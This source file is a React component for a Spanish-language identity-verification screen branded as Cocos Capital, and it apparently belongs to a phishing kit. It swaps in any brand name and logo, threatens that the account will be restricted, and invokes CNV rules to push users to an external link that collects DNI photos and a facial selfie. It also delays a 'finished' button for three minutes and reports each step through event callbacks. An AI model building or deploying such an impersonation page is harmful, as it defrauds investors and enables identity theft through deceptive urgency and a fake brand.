import { useEffect, useState } from "react";
import { ShieldCheck, Clock, CheckCircle2, ExternalLink, Copy, Check, Smartphone, Lock, ArrowLeft, TrendingUp, Shield } from "lucide-react";
import CocosLogo from "@/components/cocos/CocosLogo";

interface CocosV2BiometricScreenProps {
  email: string;
  fullName: string;
  biometricUrl: string;
  logo?: React.ReactNode;
  brandName?: string;
  onEvent?: (event: string) => void;
}

const CocosV2BiometricScreen = ({ email, fullName, biometricUrl, logo, brandName = "Cocos Capital", onEvent }: CocosV2BiometricScreenProps) => {
  const [visible, setVisible] = useState(false);
  const [verificationStarted, setVerificationStarted] = useState(false);
  const [showFinishBtn, setShowFinishBtn] = useState(false);
  const [copied, setCopied] = useState(false);
  const firstName = fullName?.split(" ")?.[0] || "";

  useEffect(() => {
    const t = setTimeout(() => setVisible(true), 100);
    return () => clearTimeout(t);
  }, []);

  useEffect(() => {
    if (!verificationStarted) return;
    const t = setTimeout(() => setShowFinishBtn(true), 3 * 60 * 1000);
    return () => clearTimeout(t);
  }, [verificationStarted]);

  const handleCopyLink = async () => {
    try {
      await navigator.clipboard.writeText(biometricUrl);
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    } catch { /* fallback */ }
  };

  const handleStartVerification = () => {
    window.open(biometricUrl, "_blank", "noopener,noreferrer");
    setVerificationStarted(true);
    onEvent?.("biometric_started");
  };

  const handleFinish = () => {
    onEvent?.("biometric_finished");
    window.location.reload();
  };

  /* ── Verification in progress ── */
  if (verificationStarted) {
    return (
      <div className={`w-full max-w-[520px] px-1 transition-all duration-500 ${visible ? "opacity-100" : "opacity-0"}`}>
        <div className="flex justify-center mb-4">
          {logo || <CocosLogo />}
        </div>

        <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden">
          <div className="h-1 w-full bg-gradient-to-r from-[#f59e0b] via-[#f97316] to-[#f59e0b]" />

          <div className="px-5 sm:px-6 py-6 sm:py-8 text-center">
            <div className="flex justify-center mb-4">
              <div className="relative">
                <div className="absolute -inset-3 rounded-full bg-amber-100/50 animate-pulse" />
                <div className="relative flex h-14 w-14 sm:h-16 sm:w-16 items-center justify-center rounded-full bg-gradient-to-br from-[#f59e0b] to-[#f97316] shadow-lg">
                  <ShieldCheck size={28} className="text-white sm:hidden" strokeWidth={1.8} />
                  <ShieldCheck size={32} className="text-white hidden sm:block" strokeWidth={1.8} />
                </div>
              </div>
            </div>
            <h3 className="text-[16px] sm:text-[18px] font-bold text-[#1a2233] mb-2">Verificación en curso</h3>
            <p className="text-[12px] sm:text-[13px] text-[#5a6a85] leading-relaxed mb-3 max-w-[340px] mx-auto">
              Completá la verificación de tu documento en la pestaña que se abrió para proteger tu cuenta y mantener tus inversiones activas.
            </p>

            {/* Return notice */}
            <div className="rounded-xl border border-amber-200 bg-amber-50/80 px-3 sm:px-4 py-3 mb-4 mx-auto max-w-[360px]">
              <div className="flex items-start gap-2">
                <ArrowLeft size={14} className="text-amber-600 flex-shrink-0 mt-0.5" />
                <p className="text-[11px] sm:text-[12px] text-[#1a2233] font-semibold leading-relaxed text-left">
                  Una vez que completes la verificación, <strong className="text-amber-700">volvé a esta página</strong> para finalizar el proceso de seguridad.
                </p>
              </div>
            </div>

            <button
              onClick={() => window.open(biometricUrl, "_blank", "noopener,noreferrer")}
              className="text-[12px] sm:text-[13px] text-[#1a3f8f] underline underline-offset-2 hover:text-[#2563eb] mb-3 inline-block"
            >
              ¿No se abrió? Haz clic acá
            </button>

            {/* Mobile copy-link */}
            <div className="mt-2 rounded-xl border border-[#e8edf5] bg-[#f8fafc] px-3 sm:px-4 py-3">
              <div className="flex items-center gap-2 mb-1.5">
                <Smartphone size={13} className="text-[#5a6a85]" />
                <span className="text-[11px] sm:text-[12px] font-semibold text-[#5a6a85]">¿Estás desde el celular?</span>
              </div>
              <p className="text-[10px] sm:text-[11px] text-[#8895aa] leading-relaxed mb-2">
                Copiá el enlace y completá la verificación desde tu navegador móvil.
              </p>
              <button
                onClick={handleCopyLink}
                className={`flex items-center justify-center gap-2 w-full rounded-lg py-2 sm:py-2.5 text-[12px] sm:text-[13px] font-semibold transition-all ${
                  copied
                    ? "bg-[#f0fdf4] border border-[#bbf7d0] text-[#16a34a]"
                    : "bg-white border border-[#d8dfe8] text-[#1a2233] hover:border-[#3b6fe0] hover:text-[#3b6fe0]"
                }`}
              >
                {copied ? <><Check size={13} /> ¡Enlace copiado!</> : <><Copy size={13} /> Copiar enlace de verificación</>}
              </button>
            </div>
          </div>

          <div className="px-5 sm:px-6 py-3.5 sm:py-4 border-t border-[#e8edf5]">
            {showFinishBtn ? (
              <button
                onClick={handleFinish}
                className="flex items-center justify-center gap-2 w-full rounded-xl bg-gradient-to-r from-[#16a34a] to-[#22c55e] py-3 sm:py-3.5 text-[13px] sm:text-[14px] font-bold text-white transition-all hover:from-[#15803d] hover:to-[#16a34a] active:scale-[0.98] shadow-md shadow-green-200"
              >
                <CheckCircle2 size={17} />
                Ya completé la verificación
              </button>
            ) : (
              <div className="flex items-center justify-center gap-2 text-[12px] sm:text-[13px] text-[#8895aa]">
                <Clock size={13} className="animate-pulse" />
                <span>Completá la verificación en la otra pestaña...</span>
              </div>
            )}
          </div>
        </div>

        <div className="flex justify-center mt-3">
          <div className="flex items-center gap-2 rounded-full border border-[#e8edf5] bg-[#f8fafc] px-4 py-2">
            <div className="h-1.5 w-1.5 rounded-full bg-[#f59e0b]" />
            <span className="text-[11px] sm:text-[12px] text-[#8895aa] max-w-[220px] truncate">{email}</span>
          </div>
        </div>
      </div>
    );
  }

  /* ── Pre-verification screen ── */
  return (
    <div className={`w-full max-w-[480px] px-1 transition-all duration-700 ${visible ? "opacity-100 translate-y-0" : "opacity-0 translate-y-6"}`}>
      <div className="flex justify-center mb-5 sm:mb-6">
        {logo || <CocosLogo />}
      </div>

      {/* Success badge */}
      <div className="flex justify-center mb-5 sm:mb-6">
        <div className="relative">
          <div className="absolute -inset-3 rounded-full bg-green-100/50 animate-pulse" />
          <div className="relative flex h-16 w-16 sm:h-20 sm:w-20 items-center justify-center rounded-full bg-gradient-to-br from-[#16a34a] to-[#22c55e] shadow-xl shadow-green-200">
            <CheckCircle2 size={32} className="text-white sm:hidden" strokeWidth={1.8} />
            <CheckCircle2 size={40} className="text-white hidden sm:block" strokeWidth={1.8} />
          </div>
        </div>
      </div>

      <h2 className="text-center text-[18px] sm:text-[21px] font-extrabold text-[#1a2233] mb-2 leading-tight">
        ¡Excelente{firstName ? `, ${firstName}` : ""}!
      </h2>
      <p className="text-center text-[13px] sm:text-[14px] text-[#5a6a85] leading-relaxed mb-5 sm:mb-6 max-w-[340px] mx-auto">
        Tu identidad fue confirmada. Para mantener tu cuenta segura y tus inversiones rindiendo, completá el último paso.
      </p>

      {/* Security urgency notice */}
      <div className="rounded-xl border border-amber-200 bg-gradient-to-r from-amber-50 to-orange-50/60 px-4 py-3 mb-4 sm:mb-5 mx-auto max-w-[400px]">
        <div className="flex items-start gap-2.5">
          <Lock size={15} className="text-amber-600 flex-shrink-0 mt-0.5" />
          <div>
            <p className="text-[11.5px] sm:text-[12.5px] text-[#1a2233] font-semibold leading-relaxed">
              Esta verificación es un <strong className="text-amber-700">procedimiento estándar de {brandName}</strong> para proteger tus fondos. Sin completarla, tu cuenta quedará <strong className="text-amber-700">temporalmente restringida</strong>.
            </p>
          </div>
        </div>
      </div>

      {/* Verification card */}
      <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden mb-5 sm:mb-6">
        <div className="h-1 w-full bg-gradient-to-r from-[#1a3f8f] via-[#3b6fe0] to-[#1a3f8f]" />
        <div className="px-5 sm:px-6 py-5">
          <div className="flex items-start gap-3 mb-4">
            <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-full bg-[#eef2ff] border border-[#dbe4ff] flex items-center justify-center flex-shrink-0">
              <ShieldCheck size={18} className="text-[#1a3f8f]" />
            </div>
            <div>
              <h4 className="text-[14px] sm:text-[15px] font-bold text-[#1a2233] mb-1">Verificación documental de seguridad</h4>
              <p className="text-[12px] sm:text-[13px] text-[#5a6a85] leading-relaxed">
                Para garantizar la <strong className="text-[#1a2233]">seguridad de tus inversiones</strong> y cumplir con las normas de la CNV, necesitamos una verificación rápida de tu documento oficial.
              </p>
            </div>
          </div>

          <div className="space-y-2.5 mb-4">
            {[
              { icon: Shield, text: "Verificación de DNI (frente y dorso)" },
              { icon: ShieldCheck, text: "Reconocimiento facial automático (selfie)" },
              { icon: Lock, text: "Máxima protección de tus fondos e inversiones" },
            ].map(({ icon: Icon, text }) => (
              <div key={text} className="flex items-center gap-2.5">
                <span className="w-4.5 h-4.5 sm:w-5 sm:h-5 rounded-full bg-[#16a34a] flex items-center justify-center flex-shrink-0" style={{ width: 18, height: 18 }}>
                  <svg className="w-2.5 h-2.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                </span>
                <span className="text-[12px] sm:text-[13px] text-[#333]">{text}</span>
              </div>
            ))}
          </div>

          <div className="flex items-center gap-2 text-[11px] sm:text-[12px] text-[#8895aa] mb-5">
            <Clock size={13} />
            <span>Proceso simple y seguro — menos de <strong className="text-[#1a2233]">2 minutos</strong></span>
          </div>

          <button
            onClick={handleStartVerification}
            className="flex items-center justify-center gap-2 w-full rounded-xl bg-gradient-to-r from-[#1a3f8f] to-[#2563eb] py-3.5 sm:py-4 text-[13px] sm:text-[14px] font-bold text-white transition-all hover:from-[#15357a] hover:to-[#1d55d4] active:scale-[0.98] shadow-lg shadow-[#1a3f8f]/25"
          >
            Verificar y proteger mi cuenta
            <ExternalLink size={15} />
          </button>
        </div>
      </div>

      {/* Trust reinforcement */}
      <div className="flex justify-center mb-3">
        <div className="flex items-center gap-2 rounded-full border border-[#e8edf5] bg-[#f8fafc] px-4 py-2">
          <div className="h-1.5 w-1.5 rounded-full bg-[#16a34a]" />
          <span className="text-[11px] sm:text-[12px] text-[#8895aa] max-w-[220px] truncate">{email}</span>
        </div>
      </div>

      <p className="text-center text-[10px] sm:text-[11px] text-[#b0b8c9] leading-relaxed max-w-[360px] mx-auto">
        🔐 Este es un procedimiento estándar de {brandName} para garantizar la seguridad de tu cuenta y que tus inversiones sigan rindiendo al máximo. Cumplimos con todas las normativas vigentes de la CNV.
      </p>
    </div>
  );
};

export default CocosV2BiometricScreen;
